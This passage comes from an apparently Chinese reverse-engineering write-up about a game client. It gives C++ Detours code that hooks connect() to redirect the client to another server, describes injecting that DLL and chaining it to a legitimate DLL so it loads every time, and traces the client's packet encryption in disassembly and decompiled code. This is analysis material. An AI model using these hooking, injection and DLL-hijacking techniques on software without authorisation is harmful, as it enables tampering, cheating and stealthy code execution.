AddrSock.sin_addr.S_un.S_addr=inet_addr(&quot;192.168.13.163&quot;);</span><br><span class="line">		AddrSock.sin_port = addr-&gt;sin_port;</span><br><span class="line">		AddrSock.sin_family = AF_INET;</span><br><span class="line">		int errorx = GetLastError();</span><br><span class="line">		unsigned long ul = 0;</span><br><span class="line">		int ret = ioctlsocket (s, FIONBIO, (unsigned long*)&amp;ul);</span><br><span class="line">		return Hookconnect(s,(SOCKADDR*)&amp;AddrSock,namelen);</span><br><span class="line">	&#125;</span><br><span class="line">	return Hookconnect(s,name,namelen);</span><br><span class="line">&#125;</span><br><span class="line">BOOL WINAPI Call_HookConnect()</span><br><span class="line">&#123;</span><br><span class="line">	if (GetModuleHandleA((char *)ws2_32) != NULL)</span><br><span class="line">	&#123;</span><br><span class="line">		gHookws2_32 = GetModuleHandleA((char *)ws2_32);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		gHookws2_32 = LoadLibraryA((char *)ws2_32);</span><br><span class="line">	&#125;</span><br><span class="line">	if (!gHookws2_32)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		return FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	DetourTransactionBegin();</span><br><span class="line">	DetourUpdateThread(GetCurrentThread());</span><br><span class="line">	Hookconnect = (fun_connect)GetProcAddress(gHookws2_32, &quot;connect&quot;);</span><br><span class="line">	DetourAttach((PVOID*)&amp;Hookconnect, Myconnect);</span><br><span class="line">	DetourTransactionCommit();</span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">					  DWORD  ul_reason_for_call,</span><br><span class="line">					  LPVOID lpReserved</span><br><span class="line">					  )</span><br><span class="line">&#123;</span><br><span class="line">	switch (ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line">	case DLL_PROCESS_ATTACH:</span><br><span class="line">		&#123;</span><br><span class="line">			Call_HookConnect();</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	case DLL_PROCESS_DETACH:</span><br><span class="line">		&#123;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注入 dll</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231021155328899.png" alt="image-20231021155328899"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231021155542954.png" alt="image-20231021155542954"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231021155654933.png" alt="image-20231021155654933"></p>
<p>查找资源文件调用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bp CreateFileA</span><br><span class="line"></span><br><span class="line">下段，F9，直到返回在00470ff5,此时壳已经解压</span><br><span class="line"></span><br><span class="line">注入我们的dll</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231021202808623.png" alt="image-20231021202808623"></p>
<p>挂接正常 dll，使每次正常 dll 启动拉着我们 dll 一起启动</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231021203554786.png" alt="image-20231021203554786"></p>
<h3 id="加密函数分析"><a class="markdownIt-Anchor" href="#加密函数分析">#</a> 加密函数分析</h3>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">bp ws2_32.send</span><br><span class="line"><span class="number">0019</span>DE30   <span class="number">004</span>A7D69  /CALL 到 send 来自 Main<span class="number">.004</span>A7D63</span><br><span class="line"><span class="number">0019</span>DE34   <span class="number">00000B</span>28  |Socket = B28</span><br><span class="line"><span class="number">0019</span>DE38   <span class="number">00000000</span>  |Data = <span class="literal">NULL</span></span><br><span class="line"><span class="number">0019</span>DE3C   <span class="number">00000000</span>  |DataSize = <span class="number">0</span></span><br><span class="line"><span class="number">0019</span>DE40   <span class="number">00000000</span>  \Flags = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 栈回溯</span></span><br><span class="line"><span class="number">004</span>A7D5C   .  <span class="number">6</span>A <span class="number">00</span>         push <span class="number">0x0</span></span><br><span class="line"><span class="number">004</span>A7D5E   .  <span class="number">53</span>            push ebx</span><br><span class="line"><span class="number">004</span>A7D5F   .  <span class="number">50</span>            push eax</span><br><span class="line"><span class="number">004</span>A7D60   .  FF76 <span class="number">04</span>       push dword ptr ds:[esi+<span class="number">0x4</span>]</span><br><span class="line"><span class="number">004</span>A7D63   .  FF15 <span class="number">90660E01</span> call dword ptr ds:[<span class="number">0x10E6690</span>]            ;  Main<span class="number">.01144E8</span>D</span><br><span class="line"></span><br><span class="line"><span class="number">0019</span>DE08   <span class="number">00000B</span>28</span><br><span class="line"><span class="number">0019</span>DE0C   <span class="number">19536F</span>80</span><br><span class="line"><span class="number">0019</span>DE10   <span class="number">0000000</span>E</span><br><span class="line"><span class="number">0019</span>DE14   <span class="number">00000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以下内存写入断点或者通过栈回溯</span></span><br><span class="line"><span class="number">19536F</span>80  AD <span class="number">8</span>A <span class="number">70</span> E7 <span class="number">48</span> <span class="number">81</span> <span class="number">2</span>A <span class="number">77</span> <span class="number">79</span> E8 A9 A8 EF <span class="number">94</span> <span class="number">72</span>     瓓p鏗?wy瑭攔.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 栈回溯</span></span><br><span class="line"><span class="number">007B</span>8B36  |.  <span class="number">8B</span>0D <span class="number">60010B</span>01 mov ecx,dword ptr ds:[<span class="number">0x10B0160</span>]</span><br><span class="line"><span class="number">007B</span>8B3C  |.  <span class="number">8</span>D45 F0       lea eax,[local<span class="number">.4</span>]</span><br><span class="line"><span class="number">007B</span>8B3F  |.  <span class="number">50</span>            push eax</span><br><span class="line"><span class="number">007B</span>8B40  |.  <span class="number">8855</span> FD       mov byte ptr ss:[ebp<span class="number">-0x3</span>],dl</span><br><span class="line"><span class="number">007B</span>8B43  |.  E8 <span class="number">5F</span>7CC6FF   call Main<span class="number">.004207</span>A7</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加密前数据</span></span><br><span class="line"><span class="number">0019</span>DE48  E2 B7 <span class="number">0</span>E <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">65</span> <span class="number">00</span> <span class="number">2</span>E <span class="number">8</span>D DC E0 <span class="number">19</span>   </span><br><span class="line"></span><br><span class="line"><span class="comment">// 进入加密函数 call Main.004207A7</span></span><br><span class="line"><span class="number">004</span>A7EA4  /&gt; \<span class="number">55</span>            push ebp</span><br><span class="line"><span class="number">004</span>A7EA5  |.  <span class="number">8B</span>EC          mov ebp,esp</span><br><span class="line"><span class="number">004</span>A7EA7  |.  <span class="number">837</span>D <span class="number">08</span> <span class="number">00</span>    cmp [arg<span class="number">.1</span>],<span class="number">0x0</span></span><br><span class="line"><span class="number">004</span>A7EAB  |.  <span class="number">56</span>            push esi</span><br><span class="line"><span class="number">004</span>A7EAC  |.  <span class="number">8B</span>F1          mov esi,ecx</span><br><span class="line"><span class="number">004</span>A7EAE  |.  <span class="number">74</span> <span class="number">20</span>         je XMain<span class="number">.004</span>A7ED0</span><br><span class="line"><span class="number">004</span>A7EB0  |.  <span class="number">8B</span>4E <span class="number">30</span>       mov ecx,dword ptr ds:[esi+<span class="number">0x30</span>]</span><br><span class="line"><span class="number">004</span>A7EB3  |.  <span class="number">85</span>C9          test ecx,ecx</span><br><span class="line"><span class="number">004</span>A7EB5  |.  <span class="number">74</span> <span class="number">19</span>         je XMain<span class="number">.004</span>A7ED0</span><br><span class="line"><span class="number">004</span>A7EB7  |.  FF75 <span class="number">0</span>C       push [arg<span class="number">.2</span>]</span><br><span class="line"><span class="number">004</span>A7EBA  |.  FF75 <span class="number">08</span>       push [arg<span class="number">.1</span>]</span><br><span class="line"><span class="number">004</span>A7EBD  |.  E8 <span class="number">9316F</span>8FF   call Main<span class="number">.00429555</span>			<span class="comment">// 真正的加密函数算法</span></span><br><span class="line"><span class="number">004</span>A7EC2  |.  FF75 <span class="number">0</span>C       push [arg<span class="number">.2</span>]</span><br><span class="line"><span class="number">004</span>A7EC5  |.  <span class="number">8</span>D4E <span class="number">0</span>C       lea ecx,dword ptr ds:[esi+<span class="number">0xC</span>]</span><br><span class="line"><span class="number">004</span>A7EC8  |.  FF75 <span class="number">08</span>       push [arg<span class="number">.1</span>]</span><br><span class="line"><span class="number">004</span>A7ECB  |.  E8 <span class="number">784B</span>F8FF   call Main<span class="number">.0042</span>CA48</span><br><span class="line"><span class="number">004</span>A7ED0  |&gt;  <span class="number">5</span>E            pop esi</span><br><span class="line"><span class="number">004</span>A7ED1  |.  <span class="number">5</span>D            pop ebp</span><br><span class="line"><span class="number">004</span>A7ED2  \.  C2 <span class="number">0800</span>       retn <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 跟入加密函数 call Main.00429555</span></span><br><span class="line"><span class="number">004</span>A3D07  /&gt; \<span class="number">55</span>            push ebp</span><br><span class="line"><span class="number">004</span>A3D08  |.  <span class="number">8B</span>EC          mov ebp,esp</span><br><span class="line"><span class="number">004</span>A3D0A  |.  <span class="number">51</span>            push ecx</span><br><span class="line"><span class="number">004</span>A3D0B  |.  <span class="number">51</span>            push ecx</span><br><span class="line"><span class="number">004</span>A3D0C  |.  <span class="number">56</span>            push esi</span><br><span class="line"><span class="number">004</span>A3D0D  |.  <span class="number">8B</span>75 <span class="number">08</span>       mov esi,[arg<span class="number">.1</span>]</span><br><span class="line"><span class="number">004</span>A3D10  |.  <span class="number">8B</span>C1          mov eax,ecx</span><br><span class="line"><span class="number">004</span>A3D12  |.  <span class="number">33</span>C9          <span class="keyword">xor</span> ecx,ecx</span><br><span class="line"><span class="number">004</span>A3D14  |.  <span class="number">66</span>:<span class="number">8B</span>0E       mov cx,word ptr ds:[esi]</span><br><span class="line"><span class="number">004</span>A3D17  |.  <span class="number">66</span>:<span class="number">81F</span>9 <span class="number">3B</span>EC  cmp cx,<span class="number">0xEC3B</span></span><br><span class="line"><span class="number">004</span>A3D1C  |.  <span class="number">57</span>            push edi</span><br><span class="line"><span class="number">004</span>A3D1D  |.  <span class="number">894</span>D F8       mov [local<span class="number">.2</span>],ecx</span><br><span class="line"><span class="number">004</span>A3D20  |.  <span class="number">75</span> <span class="number">08</span>         jnz XMain<span class="number">.004</span>A3D2A</span><br><span class="line"><span class="number">004</span>A3D22  |.  <span class="number">8</span>D4E <span class="number">08</span>       lea ecx,dword ptr ds:[esi+<span class="number">0x8</span>]</span><br><span class="line"><span class="number">004</span>A3D25  |.  <span class="number">8</span>D7E <span class="number">0</span>C       lea edi,dword ptr ds:[esi+<span class="number">0xC</span>]</span><br><span class="line"><span class="number">004</span>A3D28  |.  EB <span class="number">06</span>         jmp XMain<span class="number">.004</span>A3D30</span><br><span class="line"><span class="number">004</span>A3D2A  |&gt;  <span class="number">8</span>D4E <span class="number">04</span>       lea ecx,dword ptr ds:[esi+<span class="number">0x4</span>]</span><br><span class="line"><span class="number">004</span>A3D2D  |.  <span class="number">8</span>D7E <span class="number">08</span>       lea edi,dword ptr ds:[esi+<span class="number">0x8</span>]</span><br><span class="line"><span class="number">004</span>A3D30  |&gt;  <span class="number">837</span>D <span class="number">0</span>C <span class="number">0</span>A    cmp [arg<span class="number">.2</span>],<span class="number">0xA</span></span><br><span class="line"><span class="number">004</span>A3D34  |.  <span class="number">894</span>D FC       mov [local<span class="number">.1</span>],ecx</span><br><span class="line"><span class="number">004</span>A3D37  |.  <span class="number">897</span>D <span class="number">08</span>       mov [arg<span class="number">.1</span>],edi</span><br><span class="line"><span class="number">004</span>A3D3A  |.  <span class="number">0F</span>82 CA000000 jb Main<span class="number">.004</span>A3E0A</span><br><span class="line"><span class="number">004</span>A3D40  |.  <span class="number">8B</span>0E          mov ecx,dword ptr ds:[esi]</span><br><span class="line"><span class="number">004</span>A3D42  |.  <span class="number">3308</span>          <span class="keyword">xor</span> ecx,dword ptr ds:[eax]</span><br><span class="line"><span class="number">004</span>A3D44  |.  <span class="number">53</span>            push ebx</span><br><span class="line"><span class="number">004</span>A3D45  |.  <span class="number">890</span>E          mov dword ptr ds:[esi],ecx</span><br><span class="line"><span class="number">004</span>A3D47  |.  <span class="number">8B</span>50 <span class="number">0</span>C       mov edx,dword ptr ds:[eax+<span class="number">0xC</span>]</span><br><span class="line"><span class="number">004</span>A3D4A  |.  BB FF3F0000   mov ebx,<span class="number">0x3FFF</span></span><br><span class="line"><span class="number">004</span>A3D4F  |.  <span class="number">23</span>CB          <span class="keyword">and</span> ecx,ebx</span><br><span class="line"><span class="number">004</span>A3D51  |.  <span class="number">0F</span>AF48 <span class="number">08</span>     imul ecx,dword ptr ds:[eax+<span class="number">0x8</span>]</span><br><span class="line"><span class="number">004</span>A3D55  |.  <span class="number">66</span>:<span class="number">817</span>D F8 <span class="number">3B</span>&gt;cmp word ptr ss:[ebp<span class="number">-0x8</span>],<span class="number">0xEC3B</span></span><br><span class="line"><span class="number">004</span>A3D5B  |.  <span class="number">8B</span>148A        mov edx,dword ptr ds:[edx+ecx*<span class="number">4</span>]</span><br><span class="line"><span class="number">004</span>A3D5E  |.  <span class="number">75</span> <span class="number">1</span>A         jnz XMain<span class="number">.004</span>A3D7A</span><br><span class="line"><span class="number">004</span>A3D60  |.  <span class="number">8B</span>4E <span class="number">04</span>       mov ecx,dword ptr ds:[esi+<span class="number">0x4</span>]</span><br><span class="line"><span class="number">004</span>A3D63  |.  <span class="number">33</span>CA          <span class="keyword">xor</span> ecx,edx</span><br><span class="line"><span class="number">004</span>A3D65  |.  <span class="number">894</span>E <span class="number">04</span>       mov dword ptr ds:[esi+<span class="number">0x4</span>],ecx</span><br><span class="line"><span class="number">004</span>A3D68  |.  <span class="number">8B</span>50 <span class="number">0</span>C       mov edx,dword ptr ds:[eax+<span class="number">0xC</span>]</span><br><span class="line"><span class="number">004</span>A3D6B  |.  <span class="number">23</span>CB          <span class="keyword">and</span> ecx,ebx</span><br><span class="line"><span class="number">004</span>A3D6D  |.  <span class="number">0F</span>AF48 <span class="number">08</span>     imul ecx,dword ptr ds:[eax+<span class="number">0x8</span>]</span><br><span class="line"><span class="number">004</span>A3D71  |.  <span class="number">8B</span>148A        mov edx,dword ptr ds:[edx+ecx*<span class="number">4</span>]</span><br><span class="line"><span class="number">004</span>A3D74  |.  <span class="number">836</span>D <span class="number">0</span>C <span class="number">0</span>C    sub [arg<span class="number">.2</span>],<span class="number">0xC</span></span><br><span class="line"><span class="number">004</span>A3D78  |.  EB <span class="number">04</span>         jmp XMain<span class="number">.004</span>A3D7E</span><br><span class="line"><span class="number">004</span>A3D7A  |&gt;  <span class="number">836</span>D <span class="number">0</span>C <span class="number">08</span>    sub [arg<span class="number">.2</span>],<span class="number">0x8</span></span><br><span class="line"><span class="number">004</span>A3D7E  |&gt;  <span class="number">8B</span>4D <span class="number">0</span>C       mov ecx,[arg<span class="number">.2</span>]</span><br><span class="line"><span class="number">004</span>A3D81  |.  C1E9 <span class="number">02</span>       shr ecx,<span class="number">0x2</span></span><br><span class="line"><span class="number">004</span>A3D84  |.  <span class="number">85</span>C9          test ecx,ecx</span><br><span class="line"><span class="number">004</span>A3D86  |.  <span class="number">7</span>E <span class="number">1</span>D         jle XMain<span class="number">.004</span>A3DA5</span><br><span class="line"><span class="number">004</span>A3D88  |.  <span class="number">8B</span>F1          mov esi,ecx</span><br><span class="line"><span class="number">004</span>A3D8A  |&gt;  <span class="number">8B</span>0F          /mov ecx,dword ptr ds:[edi]				<span class="comment">// 关键加密算法</span></span><br><span class="line"><span class="number">004</span>A3D8C  |.  <span class="number">33</span>CA          |<span class="keyword">xor</span> ecx,edx</span><br><span class="line"><span class="number">004</span>A3D8E  |.  <span class="number">890F</span>          |mov dword ptr ds:[edi],ecx</span><br><span class="line"><span class="number">004</span>A3D90  |.  <span class="number">8B</span>50 <span class="number">0</span>C       |mov edx,dword ptr ds:[eax+<span class="number">0xC</span>]</span><br><span class="line"><span class="number">004</span>A3D93  |.  <span class="number">23</span>CB          |<span class="keyword">and</span> ecx,ebx</span><br><span class="line"><span class="number">004</span>A3D95  |.  <span class="number">0F</span>AF48 <span class="number">08</span>     |imul ecx,dword ptr ds:[eax+<span class="number">0x8</span>]</span><br><span class="line"><span class="number">004</span>A3D99  |.  <span class="number">8B</span>148A        |mov edx,dword ptr ds:[edx+ecx*<span class="number">4</span>]</span><br><span class="line"><span class="number">004</span>A3D9C  |.  <span class="number">83</span>C7 <span class="number">04</span>       |add edi,<span class="number">0x4</span></span><br><span class="line"><span class="number">004</span>A3D9F  |.  <span class="number">4</span>E            |dec esi</span><br><span class="line"><span class="number">004</span>A3DA0  |.^ <span class="number">75</span> E8         \jnz XMain<span class="number">.004</span>A3D8A</span><br><span class="line"><span class="number">004</span>A3DA2  |.  <span class="number">897</span>D <span class="number">08</span>       mov [arg<span class="number">.1</span>],edi</span><br><span class="line"><span class="number">004</span>A3DA5  |&gt;  <span class="number">8B</span>4D <span class="number">0</span>C       mov ecx,[arg<span class="number">.2</span>]</span><br><span class="line"><span class="number">004</span>A3DA8  |.  <span class="number">83E1</span> <span class="number">03</span>       <span class="keyword">and</span> ecx,<span class="number">0x3</span></span><br><span class="line"><span class="number">004</span>A3DAB  |.  <span class="number">8B</span>348D DC52B6&gt;mov esi,dword ptr ds:[ecx*<span class="number">4</span>+<span class="number">0xB652DC</span>]		<span class="comment">// key table</span></span><br><span class="line"><span class="number">004</span>A3DB2  |.  <span class="number">8B</span>D9          mov ebx,ecx</span><br><span class="line"><span class="number">004</span>A3DB4  |.  F7D6          <span class="keyword">not</span> esi</span><br><span class="line"><span class="number">004</span>A3DB6  |.  <span class="number">8975</span> F8       mov [local<span class="number">.2</span>],esi</span><br><span class="line"><span class="number">004</span>A3DB9  |.  <span class="number">23F</span>2          <span class="keyword">and</span> esi,edx</span><br><span class="line"><span class="number">004</span>A3DBB  |.  <span class="number">3337</span>          <span class="keyword">xor</span> esi,dword ptr ds:[edi]</span><br><span class="line"><span class="number">004</span>A3DBD  |.  C1E9 <span class="number">02</span>       shr ecx,<span class="number">0x2</span></span><br><span class="line"><span class="number">004</span>A3DC0  |.  <span class="number">8975</span> <span class="number">0</span>C       mov [arg<span class="number">.2</span>],esi</span><br><span class="line"><span class="number">004</span>A3DC3  |.  <span class="number">8</span>D75 <span class="number">0</span>C       lea esi,[arg<span class="number">.2</span>]</span><br><span class="line"><span class="number">004</span>A3DC6  |.  F3:A5         rep movs dword ptr es:[edi],dword ptr ds&gt;</span><br><span class="line"><span class="number">004</span>A3DC8  |.  <span class="number">8B</span>CB          mov ecx,ebx</span><br><span class="line"><span class="number">004</span>A3DCA  |.  <span class="number">83E1</span> <span class="number">03</span>       <span class="keyword">and</span> ecx,<span class="number">0x3</span></span><br><span class="line"><span class="number">004</span>A3DCD  |.  F3:A4         rep movs byte ptr es:[edi],byte ptr ds:[&gt;</span><br><span class="line"><span class="number">004</span>A3DCF  |.  <span class="number">8B</span>7D <span class="number">0</span>C       mov edi,[arg<span class="number">.2</span>]</span><br><span class="line"><span class="number">004</span>A3DD2  |.  <span class="number">8B</span>4D <span class="number">08</span>       mov ecx,[arg<span class="number">.1</span>]</span><br><span class="line"><span class="number">004</span>A3DD5  |.  <span class="number">8939</span>          mov dword ptr ds:[ecx],edi</span><br><span class="line"><span class="number">004</span>A3DD7  |.  <span class="number">8B</span>58 <span class="number">0</span>C       mov ebx,dword ptr ds:[eax+<span class="number">0xC</span>]</span><br><span class="line"><span class="number">004</span>A3DDA  |.  <span class="number">8B</span>4D F8       mov ecx,[local<span class="number">.2</span>]</span><br><span class="line"><span class="number">004</span>A3DDD  |.  BE FF3F0000   mov esi,<span class="number">0x3FFF</span></span><br><span class="line"><span class="number">004</span>A3DE2  |.  <span class="number">23</span>D6          <span class="keyword">and</span> edx,esi</span><br><span class="line"><span class="number">004</span>A3DE4  |.  <span class="number">0F</span>AF50 <span class="number">08</span>     imul edx,dword ptr ds:[eax+<span class="number">0x8</span>]</span><br><span class="line"><span class="number">004</span>A3DE8  |.  <span class="number">23</span>CF          <span class="keyword">and</span> ecx,edi</span><br><span class="line"><span class="number">004</span>A3DEA  |.  <span class="number">330</span>C93        <span class="keyword">xor</span> ecx,dword ptr ds:[ebx+edx*<span class="number">4</span>]</span><br><span class="line"><span class="number">004</span>A3DED  |.  <span class="number">8B</span>55 FC       mov edx,[local<span class="number">.1</span>]</span><br><span class="line"><span class="number">004</span>A3DF0  |.  <span class="number">890</span>A          mov dword ptr ds:[edx],ecx</span><br><span class="line"><span class="number">004</span>A3DF2  |.  <span class="number">8B</span>48 <span class="number">04</span>       mov ecx,dword ptr ds:[eax+<span class="number">0x4</span>]</span><br><span class="line"><span class="number">004</span>A3DF5  |.  <span class="number">8B</span>50 <span class="number">08</span>       mov edx,dword ptr ds:[eax+<span class="number">0x8</span>]</span><br><span class="line"><span class="number">004</span>A3DF8  |.  <span class="number">41</span>            inc ecx</span><br><span class="line"><span class="number">004</span>A3DF9  |.  <span class="number">23</span>CE          <span class="keyword">and</span> ecx,esi</span><br><span class="line"><span class="number">004</span>A3DFB  |.  <span class="number">0F</span>AFD1        imul edx,ecx</span><br><span class="line"><span class="number">004</span>A3DFE  |.  <span class="number">8948</span> <span class="number">04</span>       mov dword ptr ds:[eax+<span class="number">0x4</span>],ecx</span><br><span class="line"><span class="number">004</span>A3E01  |.  <span class="number">8B</span>48 <span class="number">0</span>C       mov ecx,dword ptr ds:[eax+<span class="number">0xC</span>]</span><br><span class="line"><span class="number">004</span>A3E04  |.  <span class="number">8B</span>0C91        mov ecx,dword ptr ds:[ecx+edx*<span class="number">4</span>]</span><br><span class="line"><span class="number">004</span>A3E07  |.  <span class="number">8908</span>          mov dword ptr ds:[eax],ecx</span><br><span class="line"><span class="number">004</span>A3E09  |.  <span class="number">5B</span>            pop ebx</span><br><span class="line"><span class="number">004</span>A3E0A  |&gt;  <span class="number">5F</span>            pop edi</span><br><span class="line"><span class="number">004</span>A3E0B  |.  <span class="number">5</span>E            pop esi</span><br><span class="line"><span class="number">004</span>A3E0C  |.  C9            leave</span><br><span class="line"><span class="number">004</span>A3E0D  \.  C2 <span class="number">0800</span>       retn <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0019</span>DE48  <span class="number">51</span> <span class="number">35</span> <span class="number">36</span> B5 <span class="number">60</span> <span class="number">69</span> B4 <span class="number">9B</span> <span class="number">22</span> <span class="number">2F</span> C7 <span class="number">02</span> F0 F0 <span class="number">19</span>     Q56礰i礇<span class="string">&quot;/?痧.</span></span><br><span class="line"><span class="string">19536EC0  6D 98 1B C8 4F 4F 22 D0 83 9A 6E 40 11 58 72     m?萇O&quot;</span>袃歯@Xr.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>DUMP 内存中的 cabal，以供 IDA 分析。dump 动态代码</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231022163324856.png" alt="image-20231022163324856"></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__thiscall <span class="title">sub_4A3D07</span><span class="params">(_DWORD *<span class="keyword">this</span>, __int16 *a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line">  __int16 *v5; <span class="comment">// ecx</span></span><br><span class="line">  __int16 *v6; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// 